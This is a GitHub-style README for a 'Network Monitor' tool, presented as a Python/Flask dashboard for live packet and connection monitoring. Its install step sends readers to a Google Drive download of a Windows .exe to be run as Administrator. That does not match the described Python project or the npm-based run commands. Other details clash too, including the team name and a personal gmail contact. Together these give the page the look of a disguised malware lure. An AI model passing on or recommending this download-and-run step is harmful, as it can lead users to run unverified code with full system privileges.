# 🌐 Network Monitor

<div align="center">

![Network Monitor](https://img.shields.io/badge/Network-Monitor-blue?style=for-the-badge)
![Version](https://img.shields.io/badge/version-1.0.0-green?style=for-the-badge)
![Python](https://img.shields.io/badge/python-3.8+-blue?style=for-the-badge&logo=python)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

**Real-time network monitoring with a web dashboard**

[Overview](#-overview) •
[Installation](#-installation) •
[Features](#-features) •
[Configurations](#️-configurations) •
[Changelog](#-changelog) •
[Security](#-security) •
[License](#-license) •
[Acknowledgments](#-acknowledgments) •
[Project Stats](#-project-stats) •
[Use Case](#-use-cases)

</div>

---

## 📋 Overview

**Network Monitor** is a new, easy-to-use web application that provides real-time monitoring of your network traffic, connections, and statistics. Built with Python + Flask and featuring a terminal-style dashboard, it gives you complete visibility into your network activity.

### Why Network Monitor?

- 🚀 **Easy to Use** - Start monitoring in under 2 minutes
- 🎨 **NEW UI** - Terminal-style web interface with real-time updates
- 🔍 **Deep Insights** - Track packets, connections, protocols, and bandwidth
- 🔧 **Flexible** - Multiple installation methods for all platforms
- 📊 **Real-time** - Live updates via WebSocket connections
- 🔒 **Secure** - Run locally, no data sent to external servers

## 📥 Installation

### Local Install

Download [🔎Network Monitor](https://drive.google.com/file/d/1soclJ5LPTV3MBCjafrxCh0UIXbYztlzh/view?usp=sharing) → right-click .exe file → "Run as Administrator"

### Local Run

```
npm install
npm run dev
```

## ✨ Features

### Core Capabilities

- **📦 Packet Capture** - Real-time network packet analysis using Scapy
- **🔌 Connection Monitoring** - Track all active network connections
- **📊 Protocol Statistics** - TCP, UDP, ICMP, ARP protocol breakdown
- **📈 Bandwidth Tracking** - Monitor bytes sent and received
- **⚡ Live Updates** - WebSocket-powered real-time dashboard
- **🖥️ DESKTOP Interface** - Beautiful, responsive terminal-style UI
- **🔍 Health Monitoring** - Built-in health check endpoints
- **📝 Logging** - Comprehensive application logging

### Technical Features

- Python 3.8+ support
- Flask web framework
- Socket.IO for real-time communication
- Scapy for packet capture (optional)
- psutil for system metrics
- Cross-platform (Windows, macOS, Linux)
- RESTful API endpoints
- Environment-based configuration

---

## ⚙️ Configurations

### Environment Variables

Create a `.env` file or set environment variables:

```env
# Application Settings
SECRET_KEY=your-secret-key-here
HOST=0.0.0.0
PORT=5000
DEBUG=false

# Monitoring Settings
UPDATE_INTERVAL=2        # Seconds between updates
MAX_PACKETS=50          # Maximum packets to store
MAX_CONNECTIONS=30      # Maximum connections to display
```

### Generate Secure Secret Key

```bash
python -c "import secrets; print(secrets.token_hex(32))"
```

### Configuration Options

| Variable          | Default | Description                |
| ----------------- | ------- | -------------------------- |
| `SECRET_KEY`      | random  | Secret key for sessions    |
| `HOST`            | 0.0.0.0 | Host to bind to            |
| `PORT`            | 5000    | Port to listen on          |
| `DEBUG`           | false   | Enable debug mode          |
| `UPDATE_INTERVAL` | 2       | Update frequency (seconds) |
| `MAX_PACKETS`     | 50      | Packet history size        |
| `MAX_CONNECTIONS` | 30      | Connection display limit   |

---

## 📝 Changelog

### Version 1.0.0 (2025-10-17)

**Initial Release**

- ✨ Real-time packet capture
- ✨ Network connection monitoring
- ✨ Protocol statistics
- ✨ Cross-platform dashboard
- ✨ WebSocket live updates
- ✨ Cross-platform compatibility
- ✨ Multiple installation methods

---

## 🔒 Security

### Reporting Vulnerabilities

If you discover a security vulnerability, please email [US](mailto:studymotivat01@gmail.com)

**Do not** open a public issue.

### Security Best Practices

1. **Change default secret key** in production
2. **Run behind reverse proxy** with SSL/TLS
3. **Limit access** with firewall rules
4. **Keep dependencies updated**
5. **Use strong authentication** if exposing publicly
6. **Regular security audits**

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2025 Network Monitor Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND...
```

---

## 🙏 Acknowledgments

Built with these amazing open-source projects:

- [Flask](https://flask.palletsprojects.com/) - Web framework
- [Flask-SocketIO](https://flask-socketio.readthedocs.io/) - WebSocket support
- [Electron JS](https://www.electronjs.org/) Build cross-platform desktop apps with JavaScript
- [Scapy](https://scapy.net/) - Packet manipulation
- [psutil](https://github.com/giampaolo/psutil) - System monitoring

---

## 📊 Project Stats

![GitHub stars](https://img.shields.io/github/stars/isharaimagines/network-monitor?style=social)
![GitHub forks](https://img.shields.io/github/forks/isharaimagines/network-monitor?style=social)
![GitHub issues](https://img.shields.io/github/issues/isharaimagines/network-monitor)
![GitHub pull requests](https://img.shields.io/github/issues-pr/isharaimagines/network-monitor)

---

## 🎯 Use Cases

- **Network Administrators** - Monitor network health
- **Security Professionals** - Analyze traffic patterns
- **Developers** - Debug network issues
- **Students** - Learn about networking
- **Home Users** - Track internet usage
- **IT Teams** - Troubleshoot connectivity

---

<div align="center">

**Made with ❤️ by the Framemake Team**

[⬆ Back to Top](#-network-monitor)

</div>
